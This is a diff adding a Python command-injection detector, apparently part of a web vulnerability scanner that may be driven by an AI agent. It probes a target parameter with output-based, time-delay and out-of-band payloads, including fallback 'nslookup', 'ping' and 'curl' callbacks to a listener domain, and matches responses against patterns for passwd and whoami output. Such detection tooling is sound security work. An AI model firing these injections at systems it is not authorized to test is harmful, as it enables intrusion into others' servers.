@@ -1,0 +1,273 @@
+import random
+import re
+import socket
+import statistics
+import string
+import threading
+import time
+from typing import Optional
+
+import requests
+
+from tools.http_client import build_url
+from tools.log_utils import get_logger
+from tools.payload_engine import generate, render_oob_payload
+from tools.settings import settings
+from tools.verification_oracle import ConfidenceVoter
+
+logger = get_logger("cmdi_detector")
+
+OUTPUT_INDICATORS = [
+    (r"uid=\d+\([\w]+\)", "id_output"),
+    (r"gid=\d+\([\w]+\)", "id_output"),
+    (r"groups?=\d+\([\w]+\)", "id_output"),
+    (r"Microsoft Windows", "os"),
+    (r"NT AUTHORITY", "os"),
+    (r"root:[^:]+:\d+:\d+", "passwd"),
+    (r"www-data", "user"),
+    (r"bin/bash", "shell"),
+    (r"bin/sh", "shell"),
+    (r"cmd\.exe", "os"),
+    (r"command not found", "exec_error"),
+    (r"is not recognized", "exec_error"),
+    (r"\d+ bytes from", "network"),
+    (r"time[<=]\d+", "network"),
+    (r"PING |ping statistics", "network"),
+    (r"Linux", "os"),
+    (r"DIR |dir.*Volume", "directory"),
+    (r"total \d+", "directory"),
+    (r"drwxr|xr-x", "directory"),
+    (r"Name\s+---", "windows_process"),
+    (r"TotalVirtualMemorySize", "windows_wmic"),
+    (r"FreePhysicalMemory", "windows_wmic"),
+    (r"ProcessorId", "windows_wmic"),
+    (r"HostName|Domain|UserName", "windows_env"),
+    (r"nt authority\\", "windows_whoami"),
+    (r"^[a-z0-9_.-]+\\[a-z0-9_.-]+$", "windows_user", ),
+    (r"Linux \w+ [\d.]+-", "uname"),
+    (r"Darwin \w+", "uname"),
+    (r"root@", "user"),
+    (r"groups?=\d+", "id_output"),
+]
+
+CLEAN_VALUE = "CMDI_NOMINAL_000"
+
+
+class _OobServer:
+    """Local OOB listener (DNS + HTTP) for blind CMDi.
+
+    - UDP socket binds 0.0.0.0 so LAN / VPN targets can reach the callback.
+    - When a public dnslog is configured via AIMY_OOB_DOMAIN /
+      AIMY_OOB_CALLBACK_URL, those are used instead (verification is expected
+      out-of-band by the caller / AI agent).
+    """
+
+    def __init__(self, timeout=6.0):
+        self.port = 0
+        self.timeout = timeout
+        self.caught = threading.Event()
+        self._sock = None
+        self._thread = None
+        self._lan_ip = self._get_lan_ip()
+        self.used_public = False
+        self.public_domain = ""
+        self.public_url = ""
+
+    def _get_lan_ip(self):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("10.255.255.255", 1))
+            ip = s.getsockname()[0]
+            s.close()
+            return ip
+        except Exception:
+            return "127.0.0.1"
+
+    def _public_config(self):
+        try:
+            from tools.settings import settings
+            return (settings.oob_domain or "").strip(), (settings.oob_callback_url or "").strip()
+        except Exception:
+            return "", ""
+
+    def start(self):
+        pub_domain, pub_url = self._public_config()
+        if pub_domain or pub_url:
+            self.used_public = True
+            self.public_domain = pub_domain
+            self.public_url = pub_url
+            return pub_url or "http://%s/" % pub_domain, pub_domain
+        try:
+            self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            self._sock.bind(("0.0.0.0", 0))
+            self._sock.settimeout(self.timeout)
+            self.port = self._sock.getsockname()[1]
+        except OSError:
+            return None, None
+        token = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
+        oob_domain = "%s.%s.%s.oob" % (token, self._lan_ip.replace(".", "-"), self.port)
+        oob_url = "http://%s:%d/" % (self._lan_ip, self.port)
+        self._thread = threading.Thread(target=self._listen, daemon=True)
+        self._thread.start()
+        return oob_url, oob_domain
+
+    def _listen(self):
+        while not self.caught.is_set():
+            try:
+                data, addr = self._sock.recvfrom(512)
+                self.caught.set()
+            except socket.timeout:
+                break
+            except Exception:
+                break
+
+    def stop(self):
+        if self._sock:
+            try:
+                self._sock.close()
+            except Exception:
+                pass
+
+
+def _measure_baseline_timing(url, param, sess, timeout):
+    samples = []
+    for _ in range(3):
+        try:
+            start = time.time()
+            sess.get(build_url(url, param, CLEAN_VALUE), timeout=timeout)
+            samples.append(time.time() - start)
+        except Exception:
+            pass
+    if not samples:
+        return 0.3
+    return statistics.median(samples) if len(samples) >= 3 else sum(samples) / len(samples)
+
+
+def check(url: str, param: str, sess: Optional[requests.Session] = None,
+          timeout: float = 10.0, waf_name: Optional[str] = None,
+          oob_url: Optional[str] = None,
+          oob_domain: Optional[str] = None) -> dict:
+    if sess is None:
+        sess = requests.Session()
+        sess.verify = settings.verify_ssl
+    result = {"vulnerable": False, "type": None, "evidence": [], "payload": None,
+              "oob_tested": False}
+
+    voter = ConfidenceVoter()
+
+    output_seeds = generate("cmdi", "output", "all", waf_name)
+    output_hits = 0
+    for entry in output_seeds:
+        payload = entry["payload"]
+        indicator = entry.get("indicator")
+        try:
+            r = sess.get(build_url(url, param, payload), timeout=timeout)
+            if indicator and indicator in r.text:
+                output_hits += 1
+                result["evidence"].append("cmdi: %s => %s" % (payload[:15], indicator))
+                result["payload"] = payload
+                voter.add_vote("output_indicator", 0.7)
+            for pat, label in OUTPUT_INDICATORS:
+                if re.search(pat, r.text):
+                    output_hits += 1
+                    result["evidence"].append("cmdi: %s matched <%s>" % (payload[:15], label))
+                    result["payload"] = payload
+                    voter.add_vote("output_pattern_%s" % label, 0.65)
+                    break
+        except Exception as e:
+            logger.debug("cmdi payload %s: %s", payload[:15], e)
+
+    if output_hits >= 2:
+        voter.add_vote("multi_output", 0.8)
+        result["vulnerable"] = True
+        result["type"] = "output"
+    elif output_hits == 1:
+        voter.add_vote("single_output", 0.5)
+        result["vulnerable"] = True
+        result["type"] = "output"
+
+    if not result["vulnerable"]:
+        baseline_sec = _measure_baseline_timing(url, param, sess, timeout)
+        if baseline_sec < timeout * 0.8:
+            threshold = max(2.5, baseline_sec * 1.5 + 2.0)
+            time_hits = 0
+            time_seeds = generate("cmdi", "time", "all", waf_name)
+            for entry in time_seeds:
+                payload = entry["payload"]
+                try:
+                    start = time.time()
+                    sess.get(build_url(url, param, payload), timeout=timeout + 3)
+                    elapsed = time.time() - start
+                    if elapsed >= threshold:
+                        time_hits += 1
+                        result["evidence"].append("cmdi time: %s => %.1fs (baseline=%.1fs)" % (
+                            payload[:15], elapsed, baseline_sec))
+                        result["payload"] = payload
+                        voter.add_vote("time_delay", ConfidenceVoter.vote_time_elapsed(
+                            elapsed, baseline_sec, threshold))
+                except requests.Timeout:
+                    time_hits += 1
+                    voter.add_vote("timeout", 0.7)
+                except Exception as e:
+                    logger.debug("cmdi time %s: %s", payload[:15], e)
+            if time_hits >= 2:
+                voter.add_vote("multi_time", 0.85)
+                result["vulnerable"] = True
+                result["type"] = "time"
+            elif time_hits == 1:
+                voter.add_vote("single_time", 0.5)
+                result["vulnerable"] = True
+                result["type"] = "time"
+
+    if not result["vulnerable"]:
+        oob_server = _OobServer(timeout=min(timeout, 6.0))
+        auto_oob_url, auto_oob_domain = oob_server.start()
+        cb_url = oob_url or auto_oob_url
+        cb_domain = oob_domain or auto_oob_domain
+
+        if cb_domain:
+            result["oob_tested"] = True
+            if oob_server.used_public:
+                result["oob_channel"] = "public"
+                result["oob_note"] = (
+                    "Public dnslog configured (AIMY_OOB_DOMAIN / AIMY_OOB_CALLBACK_URL): "
+                    "confirm the callback out-of-band (e.g. dnslog / interactsh API)."
+                )
+            else:
+                result["oob_channel"] = "local"
+                result["oob_note"] = (
+                    "Local OOB listener on LAN IP; external targets need a public "
+                    "callback (set AIMY_OOB_DOMAIN / AIMY_OOB_CALLBACK_URL)."
+                )
+            templates = []
+            for entry in generate("cmdi", "blind_oob", "all"):
+                rendered = render_oob_payload(entry["payload"], cb_domain, cb_url or "")
+                if rendered and "{{" not in rendered:
+                    templates.append(rendered)
+            # Guarantee at least the core templates exist.
+            if not templates:
+                templates = [
+                    "nslookup %s" % cb_domain,
+                    "ping -c 1 %s" % cb_domain,
+                    "curl %s" % (cb_url or ""),
+                ]
+            for payload in templates:
+                try:
+                    sess.get(build_url(url, param, payload), timeout=timeout)
+                except Exception:
+                    pass
+
+            if not oob_server.used_public and oob_server.caught.wait(timeout=min(timeout, 6.0)):
+                voter.add_vote("oob_callback", ConfidenceVoter.vote_oob_callback(True))
+                result["vulnerable"] = True
+                result["type"] = "oob_callback"
+                result["evidence"].append("cmdi OOB: DNS/HTTP callback received")
+                result["payload"] = templates[0] if templates else ""
+
+        oob_server.stop()
+
+
+    result["confidence_score"] = round(voter.score, 2)
+    result["confidence"] = voter.level.value
+    result["confidence_votes"] = voter.evidence()
+    return result
